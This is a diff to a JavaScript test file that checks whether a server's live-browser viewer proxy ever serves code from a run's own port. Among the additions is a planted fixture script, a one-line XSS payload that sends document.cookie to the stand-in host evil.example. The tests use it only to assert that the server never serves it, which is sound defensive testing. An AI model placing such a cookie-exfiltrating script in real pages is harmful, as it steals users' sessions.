@@ -6,9 +6,10 @@
 // owner's browser answer alone: no other API answer, no file under the data directory (the store's journal and command
 // rows among its tables), no plaintext computer_viewers column.
 //
-// The runner does not bind the browser tool yet (E2r3), so the run's viewer is a stand-in here: a loopback viewer (port 0)
-// shaped as pi-browser's own (its page at /v/<id>, its WebSocket at /v/<id>/ws), put into the store with putLiveViewer
-// under a real claim (runs.claimMany on the server's store, as a runner holds it).
+// Here the run's viewer is a stand-in, so the test holds the claim: a loopback viewer (port 0) shaped as pi-browser's own
+// (its page at /v/<id>, its WebSocket at /v/<id>/ws), put into the store with putLiveViewer under a real claim
+// (runs.claimMany on the server's store, as a runner holds it), which the test can let lapse. The runner's own browser
+// tool handing its viewer over, with a real frame through the proxy, take-over and its release, is browser-live.test.mjs's.
 import assert from "node:assert/strict";
 import { createHash, randomBytes } from "node:crypto";
 import { readdirSync, readFileSync } from "node:fs";
@@ -32,6 +33,9 @@ const filesUnder = (dir) => readdirSync(dir, { withFileTypes: true }).flatMap((e
   const path = join(dir, entry.name);
   return entry.isDirectory() ? filesUnder(path) : entry.isFile() ? [[path, readFileSync(path)]] : [];
 });
+/** What the stand-in's port answers every page and file with: a script of its own. */
+const PLANTED = "<script>fetch('https://evil.example/?' + document.cookie)</script>";
+const until = async (check, ms = 15_000) => { for (const end = Date.now() + ms; Date.now() < end; await new Promise((r) => setTimeout(r, 50))) if (await check()) return true; return false; };
 const accept = (key) => createHash("sha1").update(`${key}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest("base64");
 const frame = (text) => { const p = Buffer.from(text); return Buffer.concat([Buffer.from([0x81, p.length]), p]); };
 /** The first masked text frame in `bytes` (a client's), unmasked; undefined until it is whole. */
@@ -44,7 +48,9 @@ function firstText(bytes) {
 }
 
 /** A stand-in for the run's own viewer on loopback, shaped as pi-browser's: its page at /v/<id> (HEAD and GET), its
- *  WebSocket at /v/<id>/ws, which answers the viewer's first message with `ready`. It notes every request and upgrade. */
+ *  WebSocket at /v/<id>/ws, which answers the viewer's first message with `ready`. It notes every request and upgrade.
+ *  Every page and file it answers is a planted script (200 at its viewer's page, as its liveness check takes it, 404
+ *  elsewhere): the server must never serve one. */
 async function standInViewer(t, id) {
   const asked = [];
   const upgrades = [];
@@ -54,7 +60,7 @@ async function standInViewer(t, id) {
   const viewer = createServer((req, res) => {
     asked.push(`${req.method} ${req.url}`);
     res.writeHead(req.url === `/v/${id}` ? 200 : 404, { "content-type": "text/html" });
-    res.end(req.method === "HEAD" ? undefined : "<script src=/planted.js></script>");
+    res.end(req.method === "HEAD" ? undefined : PLANTED);
   });
   viewer.on("upgrade", (req, socket) => {
     upgrades.push({ url: req.url, headers: req.headers });
@@ -104,6 +110,9 @@ async function watched(t) {
 }
 
 const computerOf = (w, headers) => call(w.server.port, { path: `/v2/runs/${w.runId}/computer`, headers });
+/** What the run's port was asked of the viewer's code: its page (GET), its script or its style. Its liveness check (HEAD of
+ *  its page) is the server's; anything else on the machine that reaches a port it once held is no request of the server's. */
+const codeAsked = (w) => w.viewer.asked.filter((line) => line === `GET /v/${w.id}` || /^(GET|HEAD) \/(viewer\.(js|css)|v\/[^/]+\/viewer\.(js|css))$/.test(line));
 const browserOf = (w, headers, runId = w.runId) => call(w.server.port, { path: `/v2/runs/${runId}/browser`, headers });
 const liveWs = (w, path, { origin = w.origin, cookie = w.cookie, headers = {} } = {}) => connect(`ws://127.0.0.1:${w.server.port}${path}`, { origin: origin ?? undefined, headers: { ...(cookie ? { cookie } : {}), ...headers } });
 
@@ -142,7 +151,7 @@ test("a runner-path run's viewer, from the store: the owner's GET is live with i
   assert.equal(page.text, viewerAssets.html, "this server's own pi-browser viewer, byte for byte");
   assert.equal((await call(w.server.port, { path: `/v2/runs/${w.runId}/browser/live/viewer.js`, headers: { cookie: w.cookie } })).status, 200);
   assert.equal((await call(w.server.port, { path: `/v2/runs/${w.runId}/browser/live/v/AAAAAAAAAAAAAAAAAAAAAA`, headers: { cookie: w.cookie } })).status, 404, "another viewer's path is not served");
-  assert.ok(w.viewer.asked.every((line) => line === `HEAD /v/${w.id}`), `only the viewer's liveness check reached the run's port: ${w.viewer.asked.join(", ")}`);
+  assert.deepEqual(codeAsked(w), [], "the viewer's page and files were never asked of the run's port (its liveness check, HEAD, alone)");
 
   // The WebSocket: the same refusals as ever; another run's id finds no viewer.
   const other = await w.server.api("POST", "/agents/watch/runs", { input: { content: "Another." } });
@@ -214,4 +223,38 @@ test("a runner-path run's viewer token is in the owner's browser answer alone: i
   assert.deepEqual(filesUnder(w.server.data).filter(([, bytes]) => bytes.includes(w.token)).map(([path]) => path), [], "no file under the data directory (the store's journal and command tables among them)");
 });
 
-test.todo("the runner's own browser tool opens a session on a runner-path run and hands its viewer over by itself (a real frame through the proxy), and its release takes it back: waits on E2r3: the runner binds the browser tool");
+test("the viewer's code is always this server's own: the run's port answers with a planted script, and the page, viewer.js and viewer.css are this server's pi-browser copy under LIVE_CSP, on both families' addresses; only the liveness check and the socket reach the port", { timeout: 120_000 }, async (t) => {
+  const w = await watched(t);
+  for (const family of ["browser", "computer"]) {
+    const base = `/v2/runs/${w.runId}/${family}/live`;
+    for (const [rest, bytes, type] of [[`/v/${w.id}`, viewerAssets.html, /^text\/html/], ["/viewer.js", viewerAssets.js, /^text\/javascript/], ["/viewer.css", viewerAssets.css, /^text\/css/]]) {
+      const got = await call(w.server.port, { path: `${base}${rest}`, headers: { cookie: w.cookie } });
+      assert.equal(got.status, 200, `${family} ${rest}`);
+      assert.equal(got.text, bytes, `${family} ${rest}: this server's own pi-browser viewer, byte for byte`);
+      assert.ok(!got.text.includes(PLANTED));
+      assert.match(got.headers["content-type"], type);
+      assert.equal(got.headers["content-security-policy"], LIVE_CSP);
+    }
+  }
+  assert.deepEqual(codeAsked(w), [], "the viewer's page and files were never asked of the run's port (its liveness check, HEAD, alone)");
+  const socket = await liveWs(w, `/v2/runs/${w.runId}/computer/live/v/${w.id}/ws`);
+  assert.equal(socket.status, 101);
+  assert.deepEqual(w.viewer.upgrades.map(({ url }) => url), [`/v/${w.id}/ws`], "the socket alone reached it");
+  socket.ws.destroy();
+});
+
+test("a runner that dies without letting its session go names no viewer once its claim lapses, though the viewer's port still answers: GET /browser and /computer read none, and its page and socket are 404 on both families' addresses", { timeout: 120_000 }, async (t) => {
+  const w = await watched(t);
+  assert.equal((await browserOf(w, { cookie: w.cookie })).json.state, "live", "live under the runner's claim");
+  // The runner is gone: it renews no more, its row is still there, and its viewer's port still answers (a dead runner's
+  // port another listener took, or one left behind). Its claim's lease runs out at once here, with nothing dropped.
+  await w.store.renew(w.claim, { leaseMs: 1 });
+  assert.ok(await until(async () => (await browserOf(w, { cookie: w.cookie })).json.state === "none"), "a lapsed claim's viewer reads as none");
+  assert.deepEqual((await browserOf(w, { cookie: w.cookie })).json, { state: "none" });
+  assert.equal((await computerOf(w, { cookie: w.cookie })).json.state, "none");
+  for (const family of ["browser", "computer"]) {
+    assert.equal((await call(w.server.port, { path: `/v2/runs/${w.runId}/${family}/live/v/${w.id}`, headers: { cookie: w.cookie } })).status, 404, `${family}: nothing served`);
+    assert.equal((await liveWs(w, `/v2/runs/${w.runId}/${family}/live/v/${w.id}/ws`)).status, 404, `${family}: no socket`);
+  }
+  assert.deepEqual(w.viewer.upgrades, [], "nothing reached the run's port");
+});
